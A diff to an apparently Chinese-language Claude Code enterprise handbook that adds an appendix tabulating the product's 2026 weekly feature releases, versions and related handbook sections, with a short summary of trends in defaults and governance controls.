@@ -19227,6 +21791,63 @@ A：**Review 成為新瓶頸。** 實作時間大幅下降，但 PR 變大、rev
 - [ ] 我理解：**我對 AI 產生的程式碼負責**
 - [ ] 我理解：**逐行 review diff 是不可省略的**
 - [ ] 我理解：**沒有驗證就不可以宣稱完成**
+
+---
+
+## 附錄 H：2026 功能演進時間軸（What's New w13–w37）
+
+> 📌 **v1.2 新增**。依官方 `whats-new` 週報（2026-w13 至 2026-w37，官方沒有發布 w31）整理，並對照本手冊章節。週報只挑選「最可能改變工作方式」的功能；完整的修正與小改進請看官方 changelog，v2.1.247 之後的企業相關項目見第 [2.3.1](#231-v21247--v21268-補充速覽officialv11-新增) 與 [2.3.2 節](#232-v21269--v21281-補充速覽officialv12-新增)。
+
+### H.1 如何使用這份時間軸【建議】
+
+1. **判斷網路文章是否過時**：對照文章日期與下表，就能知道它是否早於某個關鍵變更（例如 w32 auto mode 成為預設、w18 Windows 不再需要 Git Bash）。
+2. **規劃版本升級**：把 `requiredMinimumVersion` 從目前版本往後推時，先看中間跨過哪些週次的變更。
+3. **每月維運**：依附錄 [F.5](#f5-覆核建議節奏) 的節奏，每月閱讀新週報並補進本表。
+
+### H.2 季度重點總覽【建議】
+
+| 期間 | 主題 | 對企業影響最大的變更 |
+| --- | --- | --- |
+| **2026 Q1 末（w13–w14）** | 自主化起步 | **auto mode 進入 research preview**；Computer use 進入 CLI |
+| **Q2 前半（w15–w20）** | 雲端與背景工作 | Routines、Ultraplan、`/ultrareview`、原生 binary、agent view、Windows 不再需要 Git Bash |
+| **Q2 後半（w21–w26）** | 模型與成本透明 | Opus 4.8、`/usage` 用量歸因、Dynamic Workflows、版本範圍強制、deny 規則比對工具參數 |
+| **Q3 前半（w27–w32）** | 預設值大翻轉 | Sonnet 5 與 Opus 5 成為預設、subagent 預設背景執行、🚨 **auto mode 成為 Pro／Max／Team 的預設（8/14 起）**、self-hosted environments public beta |
+| **Q3 後半（w33–w37）** | 治理細化 | fork mode 預設開啟、`modelPicker`、`--restricted`、Fable 5.1、`/skill-doctor`、`maxEffortLevel`、`claude plugin eval` |
+
+### H.3 逐週對照表【Official】
+
+| 週次 | 日期 | 版本 | 週報重點 | 本手冊章節 |
+| --- | --- | --- | --- | --- |
+| **w13** | 3/23–3/27 | 2.1.83–85 | **Auto mode research preview**；Desktop computer use；Web 的 PR auto-fix；`/` 搜尋 transcript；Windows 原生 PowerShell 工具；hook 的 `if` 條件 | [2.2](#22-權限模型的反轉official)、[19](#19-hooks) |
+| **w14** | 3/30–4/3 | 2.1.86–91 | **Computer use 進入 CLI**；`/powerup`；MCP 單一工具結果上限 500K；plugin 執行檔加入 Bash 的 `PATH` | [6.9](#69-computer-use螢幕控制preview) |
+| **w15** | 4/6–4/10 | 2.1.92–101 | **Ultraplan** early preview；**Monitor** 工具；`/loop` 自動調整間隔；`/team-onboarding`；`/autofix-pr` | [29](#29-spec-driven-development-與-plan-mode)、[42](#42-自動化hooksroutinesscheduled-taskschannels-與-headless) |
+| **w16** | 4/13–4/17 | 2.1.105–113 | **Opus 4.7** 與 `xhigh` effort；**Routines**；行動推播；`/usage`；**CLI 改為原生 binary** | [5.4](#54-effort-level推理投入程度official)、[42](#42-自動化hooksroutinesscheduled-taskschannels-與-headless) |
+| **w17** | 4/20–4/24 | 2.1.114–119 | **`/ultrareview`** public research preview；session recap；自訂主題；Web 改版 | [36](#36-code-reviewai-review--human-review) |
+| **w18** | 4/27–5/1 | 2.1.120–126 | 🚨 **Windows 不再需要 Git Bash**（無 Bash 時改用 PowerShell）；`claude ultrareview` 可用於 CI；`claude project purge`；以 PR URL 在 `/resume` 找回 session | [9.2](#92-windows-安裝企業重點official)、[38](#38-cicd-整合) |
+| **w19** | 5/4–5/8 | 2.1.128–136 | Plugin 可從 `.zip` 與 URL 載入；`worktree.baseRef`；**auto mode 硬性 deny 規則**；hook 可讀取 effort 等級 | [21](#21-plugins-與-marketplace)、[22](#22-permission-model-與-permission-modes) |
+| **w20** | 5/11–5/15 | 2.1.139–142 | **Agent view**（`claude agents`）；`/goal`；fast mode 預設 Opus 4.7；Rewind 的「Summarize up to here」 | [18.3](#183-agent-view背景-sessionpreview)、[12.6](#126-checkpoint-與-rewindofficial) |
+| **w21** | 5/18–5/22 | 2.1.143–149 | **Auto mode 開放 Pro 方案**；`/usage` 依 skill、subagent、plugin、MCP 歸因；新的 `/code-review`；背景 session 出現在 `/resume` | [5.7](#57-查看與控管成本official)、[36](#36-code-reviewai-review--human-review) |
+| **w22** | 5/25–5/29 | 2.1.150–157 | **Opus 4.8** 成為多個方案的預設；**Dynamic Workflows**；security-guidance plugin；fast mode 支援 Opus 4.8 | [18.6](#186-dynamic-workflowsofficial)、[25](#25-安全開發owaspsast-與安全審查) |
+| **w23** | 6/1–6/5 | 2.1.158–165 | Auto mode 支援 Bedrock／Vertex／Foundry；`acceptEdits` 寫入可執行檔前會詢問；`/plugin list`；🚨 **版本範圍強制**（`requiredMinimumVersion`） | [8.6](#86-版本控管與強制升級official)、[54](#54-provider-專頁深化bedrock--claude-platform-on-aws--vertex--foundry) |
+| **w24** | 6/8–6/12 | 2.1.166–176 | `/cd`；**subagent 可以再 spawn subagent**（背景鏈最多 5 層）；`--safe-mode`；`fallbackModel` 最多 3 個備援 | [17](#17-subagents)、[49](#49-troubleshooting) |
+| **w25** | 6/15–6/19 | 2.1.178–183 | **Artifacts** beta；🚨 **deny／ask 規則可比對工具參數**（例如 `Agent(model:opus)`）；`/config key=value`；auto mode 阻擋破壞性 git 指令 | [22.5](#225-權限規則語法official) |
+| **w26** | 6/22–6/26 | 2.1.185–193 | `claude mcp login`；shell 模式會回應指令輸出；`/rewind` 可回到 `/clear` 之前；背景 subagent 的權限提示改為顯示在主 session | [20.6](#206-認證official) |
+| **w27** | 6/29–7/3 | 2.1.195–201 | **Sonnet 5** 成為 Pro、Team Standard、Enterprise 的預設；**Claude in Chrome GA**；**subagent 預設背景執行**；Linux 版 Desktop beta | [5.2](#52-模型與別名official)、[17](#17-subagents) |
+| **w28** | 7/6–7/10 | 2.1.202–206 | Desktop 內建瀏覽器；`/doctor` 完整健檢（別名 `/checkup`）；auto mode 阻擋竄改 transcript 並在變數未解析的 `rm -rf` 前詢問 | [49](#49-troubleshooting) |
+| **w29** | 7/13–7/17 | 2.1.207–212 | Artifacts 可呼叫 MCP connectors；**螢幕閱讀器模式**；`/fork`；auto mode 在第三方 Provider 不再需要 opt-in 變數 | [56.4](#564-無障礙螢幕閱讀器模式與其他輔助設定official) |
+| **w30** | 7/20–7/24 | 2.1.214–219 | **Opus 5** 成為預設 Opus；iOS Simulator 面板；**Claude Security plugin**；`/code-review` 改在背景 subagent 執行 | [5.2](#52-模型與別名official)、[25](#25-安全開發owaspsast-與安全審查) |
+| **w32** | 8/3–8/7 | 2.1.220–224 | **Cross-session messaging**；**self-hosted environments public beta**；🚨 **auto mode 自 8/14 起成為 Pro、Max、Team 新 session 的預設權限模式**；VS Code Focus view | [2.2](#22-權限模型的反轉official)、[18.4](#184-cross-session-messagingofficial)、[55](#55-self-hosted-environments-部署實務v12-新增) |
+| **w33** | 8/10–8/14 | 2.1.225–233 | Desktop 額度重置後自動續跑；**fork mode 在互動 session 預設開啟**；GitLab MR URL 支援 `--worktree`；`@` 提及其他 session | [18](#18-平行化agent-viewagent-teamscross-session-messaging-與-dynamic-workflows) |
+| **w34** | 8/17–8/21 | 2.1.234–239 | **`/design`** research preview；內建 **Concise** output style；Remote Control 裝置卡片；`ANTHROPIC_DEFAULT_MODEL` | [14.15](#1415-output-styles改的是怎麼回答不是知道什麼official)、[5.3](#53-模型設定的優先順序official) |
+| **w35** | 8/24–8/28 | 2.1.240–250 | 在 Desktop 以 `/resume` 接續終端機 session；Claude 草擬的 `/feedback` 回報；**`--restricted`**；**`modelPicker`** | [15.7](#157-v12-新增的企業相關設定official) |
+| **w36** | 8/31–9/4 | 2.1.251–261 | **Claude Fable 5.1**（1M context）；Desktop 背景 computer use（Pro／Max）；`/diff` 即時面板；**`/skill-doctor`** | [5.2](#52-模型與別名official)、[13.6.1](#1361-skill-doctor找出白佔-context-的-skillofficialv11-新增) |
+| **w37** | 9/7–9/11 | 2.1.263–269 | **`claude plugin eval`**；Desktop 面板可彈出成獨立視窗；**`maxEffortLevel`** 可在所有 Provider 上限制 effort；WebFetch 5 分鐘未完成即失敗 | [21.12](#2112-plugin-evals以-eval-套件驗證-pluginofficialv12-新增)、[5.4](#54-effort-level推理投入程度official) |
+
+### H.4 週報之後（v2.1.270–281，2026-09-12 至 09-23）【Official】
+
+查證當日尚未發布對應的週報。依 changelog，這段期間最重要的三項是：**AGENTS.md 原生支援**（v2.1.277，見 Version Note 3）、**auto mode 分類器預設改為伺服器端**（v2.1.278，見第 [2.2.3 節](#223-auto-mode-的分類器到底擋什麼official)），以及 **Opus 5.5 成為所有方案的預設模型**（v2.1.280，見第 [5.2 節](#52-模型與別名official)）。
+
+> 🎯 **從時間軸看出的趨勢**：2026 年的 Claude Code 在三件事上持續加速：（1）**預設值由「保守」轉向「自主」**（auto mode、背景 subagent、fork mode）；（2）**治理能力同步補強**（版本範圍、參數化 deny 規則、`modelPicker`、`maxEffortLevel`、managed settings 遙測）；（3）**執行位置持續擴張**（本機 → 雲端 → self-hosted → Projects）。企業的治理規範若不跟著每季更新，**預設值的改變就會替你做決定**。
 
 ---
 
